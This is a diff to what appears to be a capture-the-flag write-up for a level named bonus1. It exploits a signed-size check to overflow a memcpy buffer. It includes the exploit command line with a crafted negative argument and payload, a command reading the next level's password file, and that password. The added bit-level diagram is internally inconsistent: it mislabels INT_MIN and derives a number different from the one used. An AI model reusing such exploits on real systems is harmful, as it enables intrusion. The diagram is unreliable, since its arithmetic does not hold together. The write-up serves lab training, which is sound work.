@@ -7,7 +7,25 @@ This means we need the memcpy() size to reach at least 44 bytes in length.
 
 The jle instruction treats the input as signed, this means we can enter a negative signed integer that will equate 44 after being multiplied by 4.
 
-./bonus1 -1073741813 $(python -c "print 'A' * 40 + 'FLOW'")
+
+
+
+
+                                                   32 bits
+                                                      |
+int_min     = 0000 0000 0000 0000 0000 0000 0000 0000 | 1000 0000 0000 0000 0000 0000 0000 0001 = -2147483647
+int_min * 4 = 1111 1111 1111 1111 1111 1111 1111 1110 | 0000 0000 0000 0000 0000 0000 0000 0100 = 4
+
+                                                    32 bits
+                                                       |
+random_int   = 1111 1111 1111 1111 1111 1111 1111 1110 | 0000 0000 0000 0000 0000 0000 0010 1100 = 44 (-8589934548)
+random_int/4 = -2147483637
+
+
+
+Number is -1073741813
+
+./bonus1 -1073741813 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")
 
 cat /home/user/bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
